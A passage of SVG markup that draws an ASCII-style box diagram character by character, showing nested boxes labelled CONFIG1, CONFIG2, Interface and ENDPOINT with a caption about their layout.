<text text-anchor='middle' x='88' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='468' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='88' y='516' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='88' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='836' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='852' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='868' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='88' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='964' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='964' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='180' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='436' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='112' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='580' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='836' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='112' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='964' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='148' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='128' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='548' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='128' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='964' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='136' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='548' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='136' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='964' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='144' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='548' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='144' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='152' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='212' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='152' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='308' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='404' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='152' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='548' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='152' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='612' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='152' y='644' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='152' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='708' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='152' y='740' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='152' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='804' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='152' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='964' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='212' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='548' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='160' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='612' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='160' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>G</text>
<text text-anchor='middle' x='168' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='212' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='548' fill='currentColor' style='font-size:1em'>G</text>
<text text-anchor='middle' x='168' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='612' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='184' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='372' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='184' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='548' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='184' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='612' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='676' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='184' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='772' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='184' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='964' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='212' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='192' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='192' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='612' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='192' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='192' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='192' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='200' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='200' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='612' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='200' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='676' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='200' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='772' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='200' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='212' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='208' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='612' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='208' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='676' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='772' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='216' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='216' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='580' fill='currentColor' style='font-size:1em'>─</text>
